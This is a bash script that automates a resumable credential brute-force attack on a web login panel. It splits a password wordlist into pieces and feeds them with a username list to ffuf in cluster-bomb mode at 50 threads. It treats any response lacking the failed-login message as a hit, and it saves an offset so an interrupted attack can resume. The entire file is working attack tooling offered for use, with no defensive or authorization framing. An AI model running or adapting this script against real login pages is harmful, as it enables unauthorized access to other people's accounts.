#!/bin/bash

# this scripts makes possible keep the progress in a brute force attack, accepting an offset value in case the attack is continued any other time, also keeps record of the findings categorized by ranges in the input wordlist, it works in Cluster bomb mode 
# the first parameter is for the password wordlist and the second is for the user

if [ "$#" -ne 4 ]; then
	echo "Usage $0 <password wordlist> <users_wordlist> <login panel url> <failed login message>"
	if [ ! -z ./requests ]; then
		echo "Make sure of creating the request file for ffuf and replace the fields related with user and password with UW and PW respectively"
		exit 1
	fi
	exit 1
fi

tput civis

offset=0
WL_path=$1

ctrl_c() {
    echo -e "\nCtrl+C Existing the brute forcing...\n"
    tput cnorm
    rm -rf $WL_path.pieces
    exit 1
}

trap ctrl_c INT

if [ ! -d results ]; then
	mkdir ./results
fi

mkdir $WL_path.pieces
split -l 50 -a 3 $WL_path $WL_path.pieces/piece_ --numeric-suffixes
number_files_created=$(ls -l $WL_path.pieces/ | wc -l)
echo -e "The amount of pieces is $number_files_created\n"
read -p "set offset: " offset

for i in $(seq -w $offset $number_files_created); 
	do
	tput civis
	echo "Piece progress $i" >> piece_progress  
	echo -E "\n\n\tPiece progress $i\n\n"
	ffuf -w $2:UW -w $WL_path.pieces/piece_$i:PW -u $3 -request requests -c -http2 -t 50 -fr "$4" -r -v -timeout 60 -o output  
	mv output ./results/results_$i
	sleep 5
done

rm -rf $WL_path.pieces

tput bel
tput cnorm

